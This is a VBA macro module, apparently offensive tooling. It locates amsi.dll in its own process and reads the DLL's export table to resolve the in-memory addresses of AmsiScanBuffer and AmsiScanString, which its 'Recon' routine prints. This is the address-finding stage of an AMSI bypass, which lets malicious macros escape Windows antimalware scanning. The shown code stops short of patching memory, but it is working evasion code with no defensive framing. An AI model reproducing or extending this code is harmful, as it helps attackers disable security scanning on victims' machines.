Attribute VB_Name = "Module1"
Type MODULEINFO
  lpBaseOfDLL As Long
  SizeOfImage As Long
  EntryPoint As Long
End Type

Public Declare Function EnumProcessModules Lib "psapi.dll" (ByVal hProcess As Long, lphModule As Long, ByVal cb As Long, lpcbNeeded As Long) As Long
Public Declare Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As Long, ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Public Declare Function GetModuleInformation Lib "psapi.dll" (ByVal hProcess As Long, ByVal hModule As Long, lpmodinfo As MODULEINFO, ByVal cb As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32.dll" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByRef lpNumberOfBytesRead As Long) As Boolean

Function GetDllBaseAddress() As Long

Dim szProcessName   As String
Dim mdi As MODULEINFO
Dim hMod(0 To 1023) As Long

'EnumProcessModules for process -1 which is the calling process
If (EnumProcessModules(-1, hMod(0), 1024, cbNeeded)) Then
    'Loop through all the values in the array
    For i = 0 To UBound(hMod)
        'Define our string as length 50 filled with 0
        szProcessName = String$(50, 0)
        'GetModuleBaseName
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        'Check if the first 8 characters of the name match amsi.dll
        If Left(szProcessName, 8) = "amsi.dll" Then
            'If it's amsi.dll getmoduleinformation which fills MODULEINFO
            GetModuleInformation -1, hMod(i), mdi, Len(mdi)
            'Print to debug out string
            Debug.Print Left(szProcessName, 8) & " BaseAddress: " & Hex(mdi.lpBaseOfDLL)
            'Return baseaddress as part of the function call
            GetDllBaseAddress = mdi.lpBaseOfDLL
        End If
    Next i
End If

End Function

Function FunctionAddress(BaseAddress As Long) As Collection

Dim size As Long
Dim ReadBytes As Long

Dim var As Collection
Set var = New Collection

success = ReadProcessMemory(-1, ByVal (BaseAddress + 248 + 24 + 96), VarPtr(ReadBytes), Len(ReadBytes), size)

IMAGE_EXPORT_DIRECTORY = BaseAddress + ReadBytes
            
AddressOfFunctions = IMAGE_EXPORT_DIRECTORY + 28
'Debug.Print "AddressOfFunctions: " & Hex(AddressOfFunctions)
                        
success = ReadProcessMemory(-1, ByVal (AddressOfFunctions), VarPtr(ReadBytes), Len(ReadBytes), size)
FuncStart = BaseAddress + ReadBytes
                   
success = ReadProcessMemory(-1, ByVal (FuncStart + (3 * 4)), VarPtr(ReadBytes), Len(ReadBytes), size)
ASBuffer = BaseAddress + ReadBytes
var.Add ASBuffer
          
success = ReadProcessMemory(-1, ByVal (FuncStart + (4 * 4)), VarPtr(ReadBytes), Len(ReadBytes), size)
ASString = BaseAddress + ReadBytes
var.Add ASString

Set FunctionAddress = var

End Function


Sub Recon()

Dim FuncAddr As Collection
Dim AS_Str As LongPtr
Dim AS_Buf As LongPtr

Set FuncAddr = FunctionAddress(GetDllBaseAddress())
AS_Buf = FuncAddr.Item(1)
AS_Str = FuncAddr.Item(2)

Debug.Print "Address of AMSIScanBuffer: " + Hex(AS_Buf)
Debug.Print "Address of AMSIScanString: " + Hex(AS_Str)

End Sub


